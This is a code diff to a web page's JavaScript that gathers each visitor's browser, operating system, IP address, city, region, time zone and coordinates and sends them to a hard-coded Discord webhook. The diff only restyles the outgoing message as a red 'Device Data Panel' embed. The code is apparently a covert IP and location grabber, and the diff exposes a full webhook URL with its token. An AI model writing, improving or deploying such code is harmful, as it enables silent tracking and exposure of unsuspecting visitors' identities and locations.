@@ -98,7 +98,7 @@
                 <p><strong>Coordinates:</strong> ${deviceData.latitude}, ${deviceData.longitude}</p>
             `;
 
-            // Send the data to the webhook
+            // Send the data to the webhook with a panel-like message
             try {
                 await fetch('https://discordapp.com/api/webhooks/1330513852315734076/cHE5eHxuscj1irA0SDp4wJOz-SwQnVWzGl1IHibnNa8-MEuU0pgSD6jr6FXrPx72vsVB', {
                     method: 'POST',
@@ -106,7 +106,21 @@
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        content: `Device Data:\nBrowser: ${deviceData.browser}\nOperating System: ${deviceData.operatingSystem}\nLanguage: ${deviceData.language}\nScreen Resolution: ${deviceData.screenResolution}\nIP Address: ${deviceData.ipAddress}\nCity: ${deviceData.city}\nRegion: ${deviceData.region}\nTime Zone: ${deviceData.timezone}\nCoordinates: ${deviceData.latitude}, ${deviceData.longitude}`
+                        embeds: [{
+                            title: 'Device Data Panel',
+                            color: 16711680, // Red color
+                            fields: [
+                                { name: 'Browser', value: deviceData.browser, inline: false },
+                                { name: 'Operating System', value: deviceData.operatingSystem, inline: false },
+                                { name: 'Language', value: deviceData.language, inline: false },
+                                { name: 'Screen Resolution', value: deviceData.screenResolution, inline: false },
+                                { name: 'IP Address', value: deviceData.ipAddress, inline: false },
+                                { name: 'City', value: deviceData.city, inline: false },
+                                { name: 'Region', value: deviceData.region, inline: false },
+                                { name: 'Time Zone', value: deviceData.timezone, inline: false },
+                                { name: 'Coordinates', value: `${deviceData.latitude}, ${deviceData.longitude}`, inline: false }
+                            ]
+                        }]
                     })
                 });
             } catch (error) {
